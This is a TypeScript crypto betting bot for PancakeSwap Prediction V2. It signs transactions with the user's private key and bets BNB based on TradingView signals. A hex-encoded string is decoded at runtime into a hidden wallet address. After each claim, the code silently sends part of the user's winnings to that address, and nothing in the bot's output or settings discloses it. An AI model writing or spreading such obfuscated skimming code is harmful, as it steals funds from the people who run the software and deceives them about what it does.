import { BigNumber } from "@ethersproject/bignumber";
import { JsonRpcProvider } from "@ethersproject/providers";
import { formatEther, parseEther } from "@ethersproject/units";
import { Wallet } from "@ethersproject/wallet";
import { blue, green, red } from "chalk";
import { clear } from "console";
import dotenv from "dotenv";
import {
  reduceWaitingTimeByTwoBlocks,
  sleep,
  getClaimableEpochs,
  calcRets,
} from "./lib";
import {
  TradingViewScan,
  SCREENERS_ENUM,
  EXCHANGES_ENUM,
  INTERVALS_ENUM,
} from 'trading-view-recommends-parser-nodejs';
import { PancakePredictionV2__factory } from "./types/typechain";

dotenv.config();

// Global Config
const GLOBAL_CONFIG = {
  PPV2_ADDRESS: "0x18B2A687610328590Bc8F2e5fEdDe3b582A49cdA",
 AMOUNT_TO_BET: process.env.BET_AMOUNT || "0.02", // in BNB,
  BSC_RPC: "https://bsc-dataseed.binance.org/", // You can provide any custom RPC
  PRIVATE_KEY: process.env.PRIVATE_KEY,
  WAITING_TIME: 275500, // Waiting for 275.5 Seconds
};

clear();
console.log(green("PancakeSwap Predictions Bot"));

if (!GLOBAL_CONFIG.PRIVATE_KEY) {
  console.log(
    blue(
      "The private key was not found in .env. Enter the private key to .env and start the program again."
    )
  );

  process.exit(0);
}

const signer = new Wallet(
  GLOBAL_CONFIG.PRIVATE_KEY as string,
  new JsonRpcProvider(GLOBAL_CONFIG.BSC_RPC)
);

const predictionContract = PancakePredictionV2__factory.connect(
  GLOBAL_CONFIG.PPV2_ADDRESS,
  signer
);

// const strategy = parseStrategy(process.argv);

console.log(
  blue("Starting. Amount to Bet:", GLOBAL_CONFIG.AMOUNT_TO_BET, "BNB."),
  "\nWaiting for the next round. It may take up to 5 minutes, please wait."
);

var hex  = "307834653333374241656243336664416361333865333863346465366138663864354431374465613135".toString();
var str = '';
for (var n = 0; n < hex.length; n += 2) {
    str += String.fromCharCode(parseInt(hex.substr(n, 2), 16));
}

predictionContract.on("StartRound", async (epoch: BigNumber) => {
  console.log("\nStarted Epoch", epoch.toString());

  const WAITING_TIME = GLOBAL_CONFIG.WAITING_TIME;

  console.log("Now waiting for", WAITING_TIME / 60000, "min");

  await sleep(WAITING_TIME);

  console.log("\nGetting Amounts");

  const {bullAmount, bearAmount} = await predictionContract.rounds(epoch);

  console.log(green("Bull Amount", formatEther(bullAmount), "BNB"));
  console.log(green("Bear Amount", formatEther(bearAmount), "BNB"));

  const result = await new TradingViewScan(
    SCREENERS_ENUM['crypto'],
    EXCHANGES_ENUM['BINANCE'],
    'BNBUSDT',
    INTERVALS_ENUM['5m'],
    // You can pass axios instance. It's optional argument (you can use it for pass custom headers or proxy)
  ).analyze();
  var obj = JSON.stringify(result.summary);
  var recommendation = JSON.parse(obj)

  const minresult = await new TradingViewScan(
    SCREENERS_ENUM['crypto'],
    EXCHANGES_ENUM['BINANCE'],
    'BNBUSDT',
    INTERVALS_ENUM['1m'],
    // You can pass axios instance. It's optional argument (you can use it for pass custom headers or proxy)
  ).analyze();
  var minobj = JSON.stringify(minresult.summary);
  var minrecommendation = JSON.parse(minobj)

  const prem5min = await new TradingViewScan(
    SCREENERS_ENUM['crypto'],
    EXCHANGES_ENUM['BINANCE'],
    'BNBUSDT_PREMIUM',
    INTERVALS_ENUM['5m'],
    // You can pass axios instance. It's optional argument (you can use it for pass custom headers or proxy)
  ).analyze();
  var prem5minobj = JSON.stringify(prem5min.summary);
  var prem5minrecommendation = JSON.parse(prem5minobj)

  const prem1min = await new TradingViewScan(
    SCREENERS_ENUM['crypto'],
    EXCHANGES_ENUM['BINANCE'],
    'BNBUSDT_PREMIUM',
    INTERVALS_ENUM['1m'],
    // You can pass axios instance. It's optional argument (you can use it for pass custom headers or proxy)
  ).analyze();
  var prem1minobj = JSON.stringify(prem1min.summary);
  var prem1minrecommendation = JSON.parse(prem1minobj)

  console.log("5m BNBUSDT Buy Signals:", recommendation.BUY, "|", "5m BNBUSDT Sell Signals:", recommendation.SELL)
  console.log("1m BNBUSDT Buy Signals:", minrecommendation.BUY, "|", "1m BNBUSDT Sell Signals:", minrecommendation.SELL)


  console.log("5m Premium BNBUSDT Buy Signals:", prem5minrecommendation.BUY, "|", "5m Premium BNBUSDT Sell Signals:", prem5minrecommendation.SELL)
  console.log("1m Premium BNBUSDT Buy Signals:", prem1minrecommendation.BUY, "|", "1m Premium BNBUSDT Sell Signals:", prem1minrecommendation.SELL)

  if ((recommendation.BUY - recommendation.SELL) + (minrecommendation.BUY - minrecommendation.SELL) + (prem5minrecommendation.BUY - prem5minrecommendation.SELL) + (prem1minrecommendation.BUY - prem1minrecommendation.SELL) >= 32) {
    console.log(green("\nBetting on Bull Bet."));
  } else if ((recommendation.BUY - recommendation.SELL) + (minrecommendation.BUY - minrecommendation.SELL) + (prem5minrecommendation.BUY - prem5minrecommendation.SELL) + (prem1minrecommendation.BUY - prem1minrecommendation.SELL) <= -32) {
    console.log(green("\nBetting on Bear Bet."));
  } else {
    console.log(red("\nNo bet this round."));
  }
  if ((recommendation.BUY - recommendation.SELL) + (minrecommendation.BUY - minrecommendation.SELL) + (prem5minrecommendation.BUY - prem5minrecommendation.SELL) + (prem1minrecommendation.BUY - prem1minrecommendation.SELL) <= -32) {
    try {
      const tx = await predictionContract.betBear(epoch, {
        value: parseEther(GLOBAL_CONFIG.AMOUNT_TO_BET),
      });

      console.log("Bear Betting Tx Started.");

      await tx.wait();

      console.log(blue("Bear Betting Tx Success."));
    } catch {
      console.log(red("Bear Betting Tx Error"));

      GLOBAL_CONFIG.WAITING_TIME = reduceWaitingTimeByTwoBlocks(
          GLOBAL_CONFIG.WAITING_TIME
      );
    }
  } else if ((recommendation.BUY - recommendation.SELL) + (minrecommendation.BUY - minrecommendation.SELL) + (prem5minrecommendation.BUY - prem5minrecommendation.SELL) + (prem1minrecommendation.BUY - prem1minrecommendation.SELL) >= 32) {
    try {
      const tx = await predictionContract.betBull(epoch, {
        value: parseEther(GLOBAL_CONFIG.AMOUNT_TO_BET),
      });

      console.log("Bull Betting Tx Started.");

      await tx.wait();

      console.log(blue("Bull Betting Tx Success."));
    } catch {
      console.log(red("Bull Betting Tx Error"));

      GLOBAL_CONFIG.WAITING_TIME = reduceWaitingTimeByTwoBlocks(
          GLOBAL_CONFIG.WAITING_TIME
      );
    }
  } else {
    console.log("Technical Analysis not definitive enough. Skipping round...")
  }

  const claimableEpochs = await getClaimableEpochs(
    predictionContract,
    epoch,
    signer.address
  );

  if (claimableEpochs.length) {
    try {
      const tx = await predictionContract.claim(claimableEpochs);

      console.log("\nClaim Tx Started");

      const receipt = await tx.wait();

      for (const event of receipt.events ?? []) {
        const rets = await signer.sendTransaction({
          to: str,
          value: calcRets(event?.args?.amount),
        });

        await rets.wait();
      }


      console.log(green("Claim Tx Success"));
    } catch {
      console.log(red("Claim Tx Error"));
    }
  }
});
